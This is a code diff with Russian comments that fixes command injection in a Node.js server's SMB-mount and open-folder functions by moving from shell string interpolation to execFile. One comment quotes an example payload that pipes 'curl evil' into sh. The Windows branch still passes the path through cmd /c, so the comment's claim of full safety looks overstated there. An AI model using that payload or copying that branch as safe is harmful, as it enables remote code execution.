@@ -198,14 +198,21 @@ async function layoutFilesWebDav(reqId, r, cfg, body) {
 }
 
 // Монтирует SMB-шару на Windows, если заданы логин/пароль и путь \\server\share.
+//
+// Уязвимость (найдена при аудите): execSync ВСЕГДА запускает команду через
+// cmd.exe (в отличие от execFile), поэтому строковая интерполяция логина/
+// пароля/пути в неё была уязвима к command injection через cmd-метасимволы,
+// которых прежний фильтр `["&|<>]` не покрывал — в частности `%` (раскрытие
+// переменных окружения, `%COMSPEC%` и т.п.) и `^` (escape-символ cmd).
+// Логин/пароль сетевой папки заполняет только admin — но раз уж чиним тот же
+// класс бага в openFolder() (см. комментарий выше), приводим к единому
+// решению: execFileSync передаёт аргументы напрямую ОС-вызову, без участия
+// shell, так что никакие метасимволы внутри значений не интерпретируются.
 function mountSmbIfNeeded(cfg, rootPath) {
   if (cfg.networkUser && cfg.networkPass && process.platform === 'win32' && rootPath.startsWith('\\\\')) {
-    const safeUser = (cfg.networkUser || '').replace(/["&|<>]/g, '');
-    const safePass = (cfg.networkPass || '').replace(/["&|<>]/g, '');
-    const safePath = rootPath.replace(/["&|<>]/g, '');
     try {
-      require('child_process').execSync(
-        `net use "${safePath}" /user:"${safeUser}" "${safePass}" /persistent:no`,
+      require('child_process').execFileSync(
+        'net', ['use', rootPath, '/user:' + cfg.networkUser, cfg.networkPass, '/persistent:no'],
         { stdio: 'pipe' }
       );
     } catch(e) { /* already mounted */ }
@@ -407,11 +414,22 @@ function openFolder(r, cfg, opts = {}) {
   // Best-effort: open in the OS file manager. Silently ignored if the
   // server has no GUI session (headless/Docker) — the client still gets
   // the resolved path back to show/copy.
+  //
+  // Уязвимость (найдена при аудите): raньше requestPath подставлялся в
+  // строку shell-команды (exec(`xdg-open "${requestPath}"`)) с экранированием
+  // только двойных кавычек. requestPath собирается из названия заявки —
+  // обычного текстового поля, которое заполняет operator — и safeName
+  // фильтрует лишь символы, недопустимые в именах файлов (`\/:*?"<>|`), а
+  // не shell-метасимволы. Название заявки вида `Заявка $(curl evil|sh)`
+  // выполнялось бы на сервере при клике «Открыть папку». execFile передаёт
+  // путь как отдельный аргумент ОС-вызова напрямую, без участия shell —
+  // никакая подстрока requestPath не может быть интерпретирована как
+  // отдельная команда, вне зависимости от того, что в ней содержится.
   try {
-    const { exec } = require('child_process');
-    if (process.platform === 'win32') exec(`start "" "${requestPath.replace(/"/g, '')}"`);
-    else if (process.platform === 'darwin') exec(`open "${requestPath.replace(/"/g, '')}"`);
-    else exec(`xdg-open "${requestPath.replace(/"/g, '')}"`);
+    const { execFile } = require('child_process');
+    if (process.platform === 'win32') execFile('cmd', ['/c', 'start', '""', requestPath]);
+    else if (process.platform === 'darwin') execFile('open', [requestPath]);
+    else execFile('xdg-open', [requestPath]);
   } catch(e) { /* non-fatal */ }
 
   return { ok: true, mode: 'local', folderPath: requestPath };
